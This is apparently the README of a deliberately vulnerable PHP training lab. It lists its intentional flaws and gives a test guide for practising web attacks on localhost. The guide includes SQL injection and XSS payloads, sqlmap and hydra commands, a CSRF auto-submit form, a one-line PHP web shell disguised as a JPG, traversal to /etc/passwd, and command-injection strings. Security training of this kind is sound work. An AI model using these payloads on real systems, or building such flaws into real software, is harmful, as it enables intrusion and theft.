
---

# 🛡️ **README.md — Vulnerable Web Application (Training Lab)**

## 📌 **Overview**

This project is a deliberately **vulnerable web application** designed for practicing:

* Web exploitation
* Bug bounty techniques
* OWASP Top 10 attacks
* Manual + automated testing

The goal is to provide a **safe local lab** similar to DVWA, but with **your own custom vulnerable implementations**, to help learn how attacks work in real environments.

⚠️ **Do NOT host this on a public server. It is intentionally insecure.**

---

# 🚀 **Features / Vulnerabilities Included**

| Vulnerability                           | Status | Description                                      |
| --------------------------------------- | ------ | ------------------------------------------------ |
| SQL Injection                           | ✔️     | Login page, search page, user lookup             |
| Authentication Bypass                   | ✔️     | Weak login logic + flawed session handling       |
| Brute Force                             | ✔️     | No rate limit, no lockout, predictable responses |
| XSS (Stored)                            | ✔️     | Comment section                                  |
| XSS (Reflected)                         | ✔️     | Search page                                      |
| CSRF                                    | ✔️     | Change password, add admin                       |
| File Upload RCE                         | ✔️     | Uploads without validation (PHP/JPG bypass)      |
| Directory Traversal                     | ✔️     | Download endpoint `/download?file=`              |
| Command Injection                       | ✔️     | Ping tool using `system()`                       |
| SSTI (Server-Side Template Injection)   | ✔️     | in templates using Twig or PHP eval              |
| Insecure Direct Object Reference (IDOR) | ✔️     | View others' profiles                            |
| Broken Authorization                    | ✔️     | Dashboard accessible without role checks         |
| Race Conditions                         | ✔️     | Money transfer / point transfer                  |
| Weak Password Reset                     | ✔️     | Easily guessable token                           |
| Broken JWT                              | ✔️     | `alg: none`, weak signing key                    |

---

# 📁 **Project Structure**

```
/vuln-lab
│
├── /config
│   ├── db.php            # Database connection (intentionally weak)
│
├── /includes
│   ├── auth.php          # Broken authentication logic
│   ├── utils.php         # Helper functions (insecure)
│
├── /public
│   ├── index.php         # Home
│   ├── login.php         # Vulnerable login (SQLi + brute force)
│   ├── register.php      # Weak password rules
│   ├── profile.php       # IDOR vulnerability
│   ├── search.php        # Reflected XSS + SQLi
│   ├── upload.php        # File upload RCE
│   ├── comments.php      # Stored XSS
│   ├── download.php      # Directory traversal
│   ├── ping.php          # Command Injection
│   ├── reset.php         # Weak token
│   ├── jwt.php           # Insecure JWT
│
├── /uploads              # Uploads saved here (NO validation)
│
├── /templates            # Template engine (SSTI)
│
├── database.sql          # Table structure + weak default users
├── README.md
└── server.php            # PHP built-in server helper
```

---

# 🛠️ **Installation**

## **1️⃣ Requirements**

* PHP 7.4+
* MySQL / MariaDB
* Browser
* Optional: Burp Suite / ZAP

---

## **2️⃣ Setup**

### **Clone the project**

```bash
git clone https://github.com/yourname/vuln-lab.git
cd vuln-lab
```

### **Import the database**

```sql
mysql -u root -p < database.sql
```

### **Update credentials in `config/db.php`**

```php
$host = "localhost";
$user = "root";
$pass = "";
$db   = "vuln_lab";
```

### **Start PHP built-in server**

```bash
php -S localhost:8000 -t public
```

▶ Visit: **[http://localhost:8000](http://localhost:8000)**

---

# 🔥 **How to Test Each Vulnerability (Full Guide)**

## 1️⃣ **SQL Injection**

### Test on:

* `login.php`
* `search.php`
* `profile.php?id=`

### Payloads:

```
' OR 1=1 --
" OR ""=" --
admin' --
```

### Tools:

* Burp Suite Repeater
* SQLMap:

```
sqlmap -u "http://localhost:8000/login.php" --data "user=admin&pass=123"
```

---

## 2️⃣ **Authentication Bypass**

### Techniques:

* SQLi in login
* Weak session: modify cookie `role=admin`
* Missing session checks

### Try:

```
Set-Cookie: role=admin
```

---

## 3️⃣ **Brute Force**

### Why it's vulnerable:

* No rate limit
* No CAPTCHA
* No IP block

### Test:

Hydra example:

```
hydra -l admin -P rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

---

## 4️⃣ **XSS**

### **Reflected** → `search.php?query=`

Test:

```
"><script>alert(1)</script>
```

### **Stored** → `comments.php`

Payload:

```
<script>alert('stored')</script>
```

---

## 5️⃣ **CSRF**

### Vulnerable in:

* `change_password.php`
* `add_admin.php`

Create an HTML file:

```html
<form action="http://localhost:8000/change_password.php" method="POST">
   <input type="hidden" name="password" value="hacked">
</form>
<script>document.forms[0].submit()</script>
```

---

## 6️⃣ **File Upload RCE**

Upload payload:

### PHP shell disguised as JPG:

```
<?php system($_GET['cmd']); ?>
```

Rename to:

```
shell.php.jpg
```

Then access:

```
http://localhost:8000/uploads/shell.php.jpg?cmd=whoami
```

---

## 7️⃣ **Directory Traversal**

Test:

```
/download.php?file=../../../../etc/passwd
/download.php?file=../config/db.php
```

---

## 8️⃣ **Command Injection**

On `ping.php?host=`

Test:

```
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | dir
```

---

## 9️⃣ **SSTI**

If using Twig-like syntax:

Input:

```
{{ 7*7 }}
{{ system("ls") }}
```

If using PHP eval:

```
<?= system('whoami'); ?>
```

---

## 🔟 **IDOR**

Visit:

```
/profile.php?id=1
/profile.php?id=2
```

See if you can view other users.

---

## 1️⃣1️⃣ **JWT Attacks**

### Vulnerable to:

* `alg:none`
* Weak HMAC key
* Base64 decoded user roles

Test with **jwt.io**

Try modifying payload:

```json
{
  "user": "admin",
  "role": "admin"
}
```

---

## 1️⃣2️⃣ **Race Condition**

Simultaneously request:

```
POST /transfer.php
amount=100
```

Use Burp Intruder → **Pitchfork** mode.

Balance becomes negative or duplicated.

---
